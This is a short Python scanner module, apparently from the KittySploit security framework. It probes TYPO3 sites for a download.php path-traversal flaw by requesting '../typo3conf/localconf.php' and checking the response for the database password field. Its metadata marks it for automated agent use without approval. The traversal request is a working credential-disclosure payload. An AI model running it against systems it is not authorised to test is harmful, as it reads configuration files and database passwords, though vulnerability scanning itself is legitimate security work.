#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects TYPO3 fileadmin/download."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TYPO3 - download.php localconf.php Disclosure Detection',
        'description': (
            'Detects TYPO3 fileadmin/download.php LFI reading typo3conf/localconf.php (TYPO3_CONF_VARS / typo_db_password).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'typo3', 'lfi', 'disclosure', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.securityfocus.com/bid/49882',
        ],
    }

    def run(self):
        suffix = '/fileadmin/download.php?Fichier_a_telecharger=../typo3conf/localconf.php'
        for base in ('', '/typo3', '/cms'):
            path = f'{base}{suffix}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            body = (r.text or '') if r else ''
            if 'TYPO3_CONF_VARS' in body and 'typo_db_password' in body:
                self.set_info(severity='high', reason='TYPO3 download.php localconf.php disclosure', path=f'{base}/fileadmin/download.php')
                return True
        return False

